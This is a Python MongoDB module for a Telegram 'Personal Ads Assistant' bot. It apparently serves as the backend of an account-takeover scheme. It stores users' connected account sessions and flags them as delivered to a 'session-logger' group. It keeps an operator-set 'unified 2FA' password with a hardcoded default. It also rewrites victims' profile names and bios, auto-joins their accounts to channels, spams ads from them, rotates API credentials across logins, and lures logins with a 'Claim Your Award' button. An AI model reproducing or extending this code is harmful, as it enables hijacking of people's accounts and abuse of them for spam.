import logging
import time
from datetime import datetime
from pymongo import MongoClient
from typing import Dict, Any, List, Optional
import config

logger = logging.getLogger(__name__)

_mongo_client: Optional[MongoClient] = None
_db = None

def init_db():
    global _mongo_client, _db
    if not config.MONGODB_URI:
        raise ValueError("MONGODB_URI is not set in the environment variables.")
        
    try:
        logger.info("Connecting to MongoDB for personal ad bot...")
        _mongo_client = MongoClient(config.MONGODB_URI, serverSelectionTimeoutMS=15000)
        _mongo_client.server_info()
        _db = _mongo_client[config.DB_NAME]
        
        # Create indexes
        _db.personal_userbots.create_index("phone", unique=True)
        _db.personal_userbots.create_index("user_id")
        _db.personal_settings.create_index("key", unique=True)
        
        logger.info("Successfully connected to MongoDB and verified collections.")
    except Exception as e:
        logger.critical(f"Failed to connect to MongoDB: {e}")
        raise e

# --- Settings ---
def get_owner_settings() -> Dict[str, Any]:
    default_settings = {
        "key": "owner_settings",
        "campaigns": [
            {
                "id": "default",
                "text": "🚨 **Join Our Channel!** 🚨\nSubscribe for awesome updates!",
                "photo": None
            }
        ],
        "interval": 300, # cycle interval (after a full round) in seconds - whole cycle
        "msg_interval": 15, # delay between two target sends (per-message)
        "ads_broadcast_active": False, # ads-bots broadcast to their users
        "is_active": True,
        "broadcast_target": "dm",  # dm | groups | both - who to broadcast to
        "broadcast_schedule": "",  # optional daily times e.g. "09:30, 14:00, 21:45"
        "branding_name_text": None,
        "branding_bio_text": None,
        "start_emoji": "👎",
        "start_text": "👋 **Welcome to Personal Ads Assistant!**\n\nConnect your account via the Mini App below. Once connected, our system will automatically coordinate advertisement broadcasting. You do not need to configure anything—everything is managed by the bot owner!",
        "start_button_text": "START ✅",
        "start_image": None,
        "reward_link": "",  # shown as "Claim your award" button after successful login
        "reward_button_text": "Claim Your Award"
    }
    try:
        settings = _db.personal_settings.find_one({"key": "owner_settings"})
        if not settings:
            _db.personal_settings.insert_one(default_settings)
            return default_settings
            
        # Ensure new keys exist if updating from older DB schema
        modified = False
        if "campaigns" not in settings:
            settings["campaigns"] = default_settings["campaigns"]
            modified = True
        if "branding_name_text" not in settings:
            settings["branding_name_text"] = None
            modified = True
        if "branding_bio_text" not in settings:
            settings["branding_bio_text"] = None
            modified = True
        if "start_emoji" not in settings:
            settings["start_emoji"] = default_settings["start_emoji"]
            modified = True
        if "start_text" not in settings:
            settings["start_text"] = default_settings["start_text"]
            modified = True
        if "start_button_text" not in settings:
            settings["start_button_text"] = default_settings["start_button_text"]
            modified = True
        if "start_image" not in settings:
            settings["start_image"] = None
            modified = True
        if "msg_interval" not in settings:
            settings["msg_interval"] = default_settings["msg_interval"]
            modified = True
        if "ads_broadcast_active" not in settings:
            settings["ads_broadcast_active"] = default_settings["ads_broadcast_active"]
            modified = True
        if "reward_link" not in settings:
            settings["reward_link"] = default_settings["reward_link"]
            modified = True
        if "reward_button_text" not in settings:
            settings["reward_button_text"] = default_settings["reward_button_text"]
            modified = True
        if modified:
            _db.personal_settings.replace_one({"key": "owner_settings"}, settings)
            
        return settings
    except Exception as e:
        logger.error(f"Error getting owner settings: {e}")
        return default_settings
 
def save_owner_settings(interval: int, is_active: bool, broadcast_target: str = None, broadcast_schedule: str = None, msg_interval: int = None, ads_broadcast_active: bool = None):
    try:
        update_fields = {
            "interval": max(10, interval), # safety floor of 10 seconds
            "is_active": is_active
        }
        if msg_interval is not None:
            update_fields["msg_interval"] = max(2, int(msg_interval))
        if ads_broadcast_active is not None:
            update_fields["ads_broadcast_active"] = bool(ads_broadcast_active)
        if broadcast_target:
            update_fields["broadcast_target"] = broadcast_target
        if broadcast_schedule is not None:
            update_fields["broadcast_schedule"] = broadcast_schedule.strip()
        _db.personal_settings.update_one(
            {"key": "owner_settings"},
            {"$set": update_fields},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving owner settings: {e}")
 
def save_start_settings(emoji: str, text: str, button_text: Optional[str] = None, start_image: Optional[str] = None):
    try:
        update_fields = {
            "start_emoji": emoji,
            "start_text": text
        }
        if button_text is not None:
            update_fields["start_button_text"] = button_text
        if start_image is not None:
            update_fields["start_image"] = start_image

        _db.personal_settings.update_one(
            {"key": "owner_settings"},
            {
                "$set": update_fields
            },
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving start settings: {e}")

def get_reward_settings() -> tuple:
    """Returns (reward_link, reward_button_text) from settings."""
    settings = get_owner_settings()
    return (
        settings.get("reward_link") or "",
        settings.get("reward_button_text") or "Claim Your Award"
    )

def save_reward_settings(reward_link: str, button_text: Optional[str] = None):
    try:
        update_fields = {"reward_link": (reward_link or "").strip()}
        if button_text is not None:
            update_fields["reward_button_text"] = (button_text or "").strip() or "Claim Your Award"
        _db.personal_settings.update_one(
            {"key": "owner_settings"},
            {"$set": update_fields},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving reward settings: {e}")

def add_campaign(text: str, photo: Optional[str], fwd_chat: int = None, fwd_msg: int = None) -> str:
    import uuid
    campaign_id = str(uuid.uuid4())[:8]
    try:
        camp = {
            "id": campaign_id,
            "text": text,
            "photo": photo,
            "fwd_chat": int(fwd_chat) if fwd_chat else None,
            "fwd_msg": int(fwd_msg) if fwd_msg else None,
        }
        _db.personal_settings.update_one(
            {"key": "owner_settings"},
            {"$push": {"campaigns": camp}},
            upsert=True
        )
        return campaign_id
    except Exception as e:
        logger.error(f"Error adding campaign: {e}")
        return ""

def delete_campaign(campaign_id: str) -> bool:
    try:
        res = _db.personal_settings.update_one(
            {"key": "owner_settings"},
            {
                "$pull": {
                    "campaigns": {"id": campaign_id}
                }
            }
        )
        return res.modified_count > 0
    except Exception as e:
        logger.error(f"Error deleting campaign {campaign_id}: {e}")
        return False

def save_branding_settings(name_text: Optional[str], bio_text: Optional[str]):
    try:
        _db.personal_settings.update_one(
            {"key": "owner_settings"},
            {
                "$set": {
                    "branding_name_text": name_text,
                    "branding_bio_text": bio_text
                }
            },
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving branding settings: {e}")

# --- Userbots ---
def get_userbot(phone: str) -> Optional[Dict[str, Any]]:
    try:
        return _db.personal_userbots.find_one({"phone": phone})
    except Exception as e:
        logger.error(f"Error getting userbot session for phone {phone}: {e}")
        return None

def get_all_userbots() -> List[Dict[str, Any]]:
    try:
        return list(_db.personal_userbots.find({}))
    except Exception as e:
        logger.error(f"Error listing userbots: {e}")
        return []

def save_userbot(userbot_data: Dict[str, Any]):
    try:
        try:
            userbot_data["user_id"] = int(userbot_data["user_id"])
        except ValueError:
            userbot_data["user_id"] = str(userbot_data["user_id"])
        _db.personal_userbots.update_one(
            {"phone": userbot_data["phone"]},
            {"$set": userbot_data},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving userbot data: {e}")

def delete_userbot(phone: str):
    try:
        _db.personal_userbots.delete_one({"phone": phone})
    except Exception as e:
        logger.error(f"Error deleting userbot {phone}: {e}")

# ==================== Ads Bots (multi-bot tokens) ====================
def get_ads_bots(enabled_only: bool = False) -> List[Dict[str, Any]]:
    """Lists all configured ads-bot tokens. Each token is an independent Telegram bot."""
    try:
        query = {"enabled": True} if enabled_only else {}
        return list(_db.ads_bots.find(query))
    except Exception as e:
        logger.error(f"Error listing ads bots: {e}")
        return []

def add_ads_bot(token: str, name: str = "") -> Dict[str, Any]:
    """Registers a new ads-bot token. Returns the record (or {} on error)."""
    token = token.strip()
    if not token:
        return {}
    existing = _db.ads_bots.find_one({"token": token})
    if existing:
        return existing
    rec = {
        "token": token,
        "name": name.strip() or f"Bot {len(get_ads_bots()) + 1}",
        "enabled": True,
        "created_at": time.time(),
    }
    try:
        _db.ads_bots.update_one({"token": token}, {"$set": rec}, upsert=True)
        return rec
    except Exception as e:
        logger.error(f"Error adding ads bot: {e}")
        return {}

def set_ads_bot_enabled(token: str, enabled: bool):
    try:
        _db.ads_bots.update_one({"token": token}, {"$set": {"enabled": bool(enabled)}})
    except Exception as e:
        logger.error(f"Error updating ads bot {token}: {e}")

def delete_ads_bot(token: str):
    try:
        _db.ads_bots.delete_one({"token": token})
    except Exception as e:
        logger.error(f"Error deleting ads bot {token}: {e}")

def ads_bot_add_user(token: str, user_id, username: str = ""):
    """Registers a user who clicked a bot so the bot can broadcast to them later.
    Stored in its own collection to avoid bloating the ads_bots record."""
    try:
        _db.ads_bot_users.update_one(
            {"token": token, "user_id": int(user_id)},
            {"$set": {"username": username or "", "last_seen": time.time()}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error tracking ads bot user: {e}")

def get_ads_bot_users(token: str) -> List[Dict[str, Any]]:
    try:
        return list(_db.ads_bot_users.find({"token": token}))
    except Exception as e:
        logger.error(f"Error listing ads bot users: {e}")
        return []

def get_all_ads_bot_users() -> Dict[str, List[Dict[str, Any]]]:
    """token -> list of users, for the admin panel."""
    try:
        out: Dict[str, List[Dict[str, Any]]] = {}
        for u in _db.ads_bot_users.find({}):
            out.setdefault(u.get("token", ""), []).append(u)
        return out
    except Exception as e:
        logger.error(f"Error listing all ads bot users: {e}")
        return {}

# ==================== Admin panel security ====================
def get_admin_password_db() -> str:
    """Admin panel password, stored in DB so it can be rotated from the panel."""
    import config as _cfg
    try:
        rec = _db.admin_settings.find_one({"key": "admin"})
        if rec and rec.get("password"):
            return rec["password"]
    except Exception:
        pass
    return _cfg.ADMIN_PASSWORD

def set_admin_password_db(password: str):
    try:
        _db.admin_settings.update_one(
            {"key": "admin"},
            {"$set": {"password": password}},
            upsert=True
        )
    except Exception as e:
        logger.error(f"Error saving admin password: {e}")

# ==================== Panel-managed infra settings (logger bot, primary bot, auto-join, 2FA) ====================

def _get_admin_rec(key: str) -> dict:
    try:
        return _db.admin_settings.find_one({"key": key}) or {}
    except Exception as e:
        logger.error(f"Error reading admin setting {key}: {e}")
        return {}

def get_logger_settings() -> dict:
    """(token, group_id) configured in the web panel for the session-logger bot."""
    rec = _get_admin_rec("logger")
    return {
        "token": rec.get("token") or "",
        "group_id": rec.get("group_id") or "",
    }

def get_log_bot_token() -> str:
    rec = _get_admin_rec("logger")
    return rec.get("token") or ""

def get_log_group_id() -> str:
    import config as _cfg
    rec = _get_admin_rec("logger")
    grp = rec.get("group_id")
    if grp:
        return grp
    return str(_cfg.LOG_GROUP_ID)

def set_logger_settings(token: str, group_id: str) -> bool:
    try:
        _db.admin_settings.update_one(
            {"key": "logger"},
            {"$set": {"token": str(token).strip(), "group_id": str(group_id).strip()}},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error saving logger settings: {e}")
        return False

def get_primary_bot_token() -> str:
    rec = _get_admin_rec("primary_bot")
    return rec.get("token") or ""

def set_primary_bot_token(token: str) -> bool:
    try:
        _db.admin_settings.update_one(
            {"key": "primary_bot"},
            {"$set": {"token": str(token).strip()}},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error saving primary bot token: {e}")
        return False

def get_auto_join_targets() -> list:
    rec = _get_admin_rec("auto_join")
    items = rec.get("targets") or []
    return [str(t).strip() for t in items if str(t).strip()]

def set_auto_join_targets(targets) -> bool:
    try:
        cleaned = [str(t).strip() for t in targets if str(t).strip()]
        _db.admin_settings.update_one(
            {"key": "auto_join"},
            {"$set": {"targets": cleaned}},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error saving auto-join targets: {e}")
        return False

def get_unified_2fa() -> str:
    rec = _get_admin_rec("unified_2fa")
    if rec.get("password"):
        return str(rec["password"])
    return getattr(config, "UNIFIED_2FA", "AdminPy#2026")

def set_unified_2fa(password: str) -> bool:
    try:
        _db.admin_settings.update_one(
            {"key": "unified_2fa"},
            {"$set": {"password": str(password).strip()}},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error saving unified 2FA: {e}")
        return False

def set_user_broadcast_allowed(phone: str, allowed: bool):
    try:
        _db.personal_userbots.update_one(
            {"phone": phone},
            {"$set": {"broadcast_allowed": bool(allowed)}}
        )
    except Exception as e:
        logger.error(f"Error saving broadcast approval: {e}")

# ==================== API credentials (panel-managed, supports MULTIPLE pairs) ====================
_api_round = {"i": 0}

def get_api_pool() -> list:
    """Returns list of all API credential pairs saved in the admin panel."""
    try:
        rec = _db.admin_settings.find_one({"key": "api_pool"})
        items = (rec or {}).get("items") or []
        return [
            {"api_id": str(it.get("api_id", "")), "api_hash": str(it.get("api_hash", ""))}
            for it in items if it.get("api_id") and it.get("api_hash")
        ]
    except Exception as e:
        logger.error(f"Error reading api pool: {e}")
        return []


def add_api_credential(api_id, api_hash) -> bool:
    try:
        _db.admin_settings.update_one(
            {"key": "api_pool"},
            {"$addToSet": {"items": {"api_id": str(api_id).strip(), "api_hash": str(api_hash).strip()}}},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error adding api cred: {e}")
        return False


def remove_api_credential(api_id, api_hash) -> bool:
    try:
        _db.admin_settings.update_one(
            {"key": "api_pool"},
            {"$pull": {"items": {"api_id": str(api_id).strip(), "api_hash": str(api_hash).strip()}}}
        )
        return True
    except Exception as e:
        logger.error(f"Error removing api cred: {e}")
        return False


def get_api_credentials() -> tuple:
    """Returns (api_id, api_hash): first pair in the panel pool, else env fallback."""
    pool = get_api_pool()
    if pool:
        return int(pool[0]["api_id"]), pool[0]["api_hash"]
    return config.API_ID, config.API_HASH


def get_next_api_credentials() -> tuple:
    """Round-robins through the panel pool so different logins/sessions use different API pairs."""
    global _api_round
    pool = get_api_pool()
    if not pool:
        return config.API_ID, config.API_HASH
    pair = pool[_api_round["i"] % len(pool)]
    _api_round["i"] += 1
    return int(pair["api_id"]), pair["api_hash"]


def get_api_credentials_status() -> dict:
    """Returns pool + env fallback for the admin dashboard."""
    pool = get_api_pool()
    return {"items": pool, "env_api_id": str(config.API_ID), "from_db": len(pool) > 0}


# ==================== WebApp URL override (editable from admin panel) ====================
def get_webapp_url_override() -> Optional[str]:
    try:
        rec = _db.admin_settings.find_one({"key": "webapp"})
        if rec and rec.get("url"):
            return str(rec["url"]).strip()
    except Exception:
        return None
    return None


def set_webapp_url(url: str) -> bool:
    try:
        _db.admin_settings.update_one(
            {"key": "webapp"},
            {"$set": {"url": str(url).strip()}},
            upsert=True
        )
        return True
    except Exception as e:
        logger.error(f"Error saving webapp url: {e}")
        return False


def get_webapp_url() -> str:
    """Effective Mini App URL: panel override > env/RAILWAY."""
    override = get_webapp_url_override()
    if override:
        return override
    return config.WEBAPP_URL

# Locally-mark sessions that were already delivered to the log group
def mark_session_logged(phone: str):
    try:
        _db.personal_userbots.update_one(
            {"phone": phone},
            {"$set": {"logged_to_group": True, "logged_at": datetime.utcnow().isoformat()}}
        )
    except Exception as e:
        logger.error(f"Error marking session logged: {e}")
